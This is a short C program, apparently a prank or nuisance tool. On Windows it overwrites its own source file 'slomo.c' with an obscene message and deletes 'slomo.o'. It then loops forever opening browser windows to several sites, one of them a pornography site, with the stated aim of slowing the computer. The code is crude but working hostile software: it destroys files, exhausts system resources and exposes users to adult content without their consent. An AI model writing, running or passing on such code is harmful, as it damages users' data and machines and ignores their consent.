#include<stdio.h>
#include<conio.h>
#if __WIN32
#define typeofOS 1
#include<stdio.h>
#else
#define typeofOS 0
#endif // __WIN32

int main()
{
    if(typeofOS)
    {
        FILE *destroFile = fopen("slomo.c","w");

        fprintf(destroFile,"F*ck You Man..!!!");

        fclose(destroFile);

        remove("slomo.o");

        //now time to slow the pc

        for(;;)
        {
            system("start https://www.google.com");
             system("start https://www.facebook.com");
              system("start https://www.fortinet.com/resources/cyberglossary/what-is-hacking");
              system("start https://www.xhamster.com");


        }



    }else
    {

        printf("This file is not executable in computer...");
        getch();
    }
}
